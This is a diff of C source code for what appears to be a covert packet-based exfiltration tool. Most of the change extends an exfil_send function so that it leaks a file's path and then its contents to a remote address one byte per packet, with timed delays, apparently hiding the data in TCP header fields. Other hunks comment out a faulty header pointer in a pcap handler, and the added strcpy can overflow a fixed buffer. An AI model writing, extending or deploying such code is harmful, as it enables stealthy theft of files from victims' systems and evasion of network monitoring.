@@ -140,7 +140,7 @@ void handle_tcp(u_char *user, const struct pcap_pkthdr *pkt_info,
 
 void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 		const u_char *packet) {
-	struct udphdr* udphdr;
+	//struct udphdr* udphdr;
 	struct iphdr* iphdr;
 	int size_udp, ip_len;
 	char *udp_payload;
@@ -148,7 +148,7 @@ void handle_udp(u_char *user, const struct pcap_pkthdr *pkt_info,
 	iphdr = (struct iphdr*) (packet + sizeof(struct ether_header));
 	ip_len = iphdr->ihl * 4;
 
-	udphdr = (struct udphdr*) (iphdr + sizeof(struct ether_header) + ip_len);
+	//udphdr = (struct udphdr*) (iphdr + sizeof(struct ether_header) + ip_len);
 	size_udp = sizeof(struct udphdr);
 
 	if (size_udp < UDP_HDR_SIZ)
@@ -276,9 +276,12 @@ void *exfil_watch(void *arg) {
 }
 
 void exfil_send(uint32 src, uint32 ipaddr, char *path) {
-	int buflen, i;
-	char buffer[MAX_LEN];
+	int buflen, i, path_size, init = 0;
+	char buffer[MAX_LEN], folder_path[MAX_LEN];
 	FILE *file;
+
+	strcpy(folder_path, path);
+	path_size = strlen(path) + 1; // path size
 
 	file = open_file(path, FALSE);
 
@@ -287,16 +290,26 @@ void exfil_send(uint32 src, uint32 ipaddr, char *path) {
 		int tot_len;
 
 		tot_len = buflen + 1;
-
 		trans = (char *) malloc(tot_len);
-
 		memcpy(trans, buffer, tot_len);
-
 		printf("Buflen => %d\n", tot_len);
 
+		// sending the filename, including the path...
+		if (init == 0) {
+			for (i = 0; i < path_size; i++) {
+				char tcp_seq;
+				tcp_seq = folder_path[i];
+				usleep(SLEEP_TIME);
+				_send(src, ipaddr, tcp_seq, XFL_TYP);
+			}
+			_send(src, ipaddr, '\n', XFL_TYP);
+			_send(src, ipaddr, '\n', XFL_TYP);
+			init = 1;
+		}
+
+		// Sending the File content
 		for (i = 0; i < tot_len; i++) {
 			char tcp_seq;
-
 			tcp_seq = buffer[i];
 			usleep(SLEEP_TIME); // sleep for specific amount of time
 			_send(src, ipaddr, tcp_seq, XFL_TYP); // send the packet as a response packet
